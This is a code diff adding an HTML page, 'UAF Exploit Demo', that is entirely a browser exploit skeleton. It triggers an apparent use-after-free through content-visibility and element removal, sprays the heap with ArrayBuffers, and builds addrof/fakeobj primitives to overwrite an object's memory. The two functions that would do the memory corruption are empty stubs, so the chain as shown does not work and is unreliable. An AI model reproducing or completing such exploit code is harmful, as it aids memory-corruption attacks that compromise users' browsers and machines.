@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>UAF Exploit Demo</title>
+  <style>
+    .container {
+      content-visibility: auto;
+    }
+    .child {
+      width: 100px;
+      height: 100px;
+      background: red;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="child"></div>
+  </div>
+  <script type="module">
+    const container = document.querySelector(".container");
+    const child = document.querySelector(".child");
+
+    function heapSpray(count, size) {
+      let spray = [];
+      for (let i = 0; i < count; i++) {
+        let buf = new ArrayBuffer(size);
+        let view = new Uint8Array(buf);
+        for (let j = 0; j < view.length; j++) view[j] = 0x42;
+        spray.push(view);
+      }
+      return spray;
+    }
+
+    let addrof = null;
+    let fakeobj = null;
+
+    function triggerUAFandPrepare() {
+      container.style.contentVisibility = "hidden";
+      child.remove();
+      setTimeout(() => {
+        container.style.contentVisibility = "auto";
+        let spray = heapSpray(20000, 0x1000);
+        prepareFakeObjectPrimitive(spray);
+      }, 0);
+    }
+
+    const observer = new MutationObserver(() => {
+      triggerUAFandPrepare();
+    });
+    observer.observe(container, { childList: true, subtree: true });
+
+    function prepareFakeObjectPrimitive(spray) {
+      for (let i = 0; i < spray.length; i++) {
+        try {
+          let len = spray[i].length;
+          if (len > 0x1000000 || len < 0) {
+            let victim = spray[i];
+            buildAddrofFakeobj(victim);
+            return;
+          }
+        } catch (e) {}
+      }
+    }
+
+    function buildAddrofFakeobj(victim) {
+      const OFFSET_DATAPTR = 0x28;
+
+      addrof = function(obj) {
+        corruptPointerOf(victim, obj, OFFSET_DATAPTR);
+        let fakeDV = new DataView(victim.buffer);
+        let addr = fakeDV.getFloat64(0, true);
+        return addr;
+      };
+
+      fakeobj = function(addr) {
+        corruptAddressIn(victim, addr, OFFSET_DATAPTR);
+        return victim;
+      };
+
+      demoArbitraryRW();
+    }
+
+    function corruptPointerOf(victim, obj, offset) {}
+
+    function corruptAddressIn(victim, addr, offset) {}
+
+    function demoArbitraryRW() {
+      let trustedObj = { marker: 0x41424344 };
+      let trustedAddr = addrof(trustedObj);
+      let offsetMarker = 0x10;
+      let fake = fakeobj(trustedAddr + offsetMarker);
+      let dv = new DataView(fake.buffer);
+      let leakedMarker = dv.getUint32(0, true);
+      dv.setUint32(0, 0x13371337, true);
+      console.assert(trustedObj.marker === 0x13371337);
+    }
+  </script>
+</body>
+</html>
